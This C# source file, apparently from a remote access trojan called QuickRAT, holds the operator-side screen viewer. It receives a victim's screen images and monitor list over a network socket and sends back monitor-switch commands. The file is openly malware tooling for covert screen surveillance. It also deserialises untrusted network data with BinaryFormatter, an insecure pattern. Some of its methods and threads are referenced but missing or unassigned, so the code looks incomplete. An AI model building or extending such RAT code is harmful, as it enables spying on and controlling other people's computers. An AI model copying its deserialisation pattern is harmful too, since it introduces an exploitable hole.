using System;
using System.Collections.Generic;
using System.Drawing;
using System.Net;
using System.Net.Sockets;
using System.Runtime.Serialization.Formatters.Binary;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace QuickRAT_Host
{
    public partial class ScreenView : UserControl
    {
        internal int port;
        private NetworkStream mainStream;
        private NetworkStream monitorCounter;
        private NetworkStream monitorStream;

        private readonly Thread Listening;
        private readonly Thread GetImage;
        private readonly Thread CountMonitors;
        internal string[] monitors = new string[10];

        public ScreenView()
        {
            GetImage = new Thread(ReceiveImage);
            //CountMonitors = new Thread(CountMonitors);
            //Listening = new Thread(StartListening);

            InitializeComponent();
            startbtn.Click += StartListening;
            stopbtn.Click += StopListening;
            monitorselector.SelectedIndexChanged += SwitchMonitorIndex;
        }

        private void SwitchMonitorIndex(object sender, EventArgs e)
        {
            int byteCount = Encoding.ASCII.GetByteCount(monitorselector.SelectedIndex.ToString() + 1);
            byte[] sendData = new byte[byteCount];
            sendData = Encoding.ASCII.GetBytes(monitorselector.SelectedIndex.ToString());
            monitorStream = Connection.client.GetStream();
            monitorStream.Write(sendData, 0, sendData.Length);
        }

        private void ReceiveImage()
        {
            BinaryFormatter binFormatter = new BinaryFormatter();

            while (Connection.client.Connected)
            {
                mainStream = Connection.client.GetStream();
                screenimage.Image = (Image)binFormatter.Deserialize(mainStream);
            }
        }

        private void ReceiveMonitors()
        {
            int recv = 0;
            monitorCounter = Connection.client.GetStream();
            byte[] buffer = new byte[8096];
            monitorCounter.Read(buffer, 0, buffer.Length);
            foreach (byte b in buffer)
            {
                if (b != 0)
                {
                    recv++;
                }
            }
            string request = Encoding.UTF8.GetString(buffer, 0, recv);
            monitors = request.Split(',');

            for (int i = 0; i < monitors.Length; i++)
            {
                monitorselector.Invoke((MethodInvoker)delegate
                {
                    monitorselector.Items.Add(monitors[i]);
                });
            }
        }

    }
}
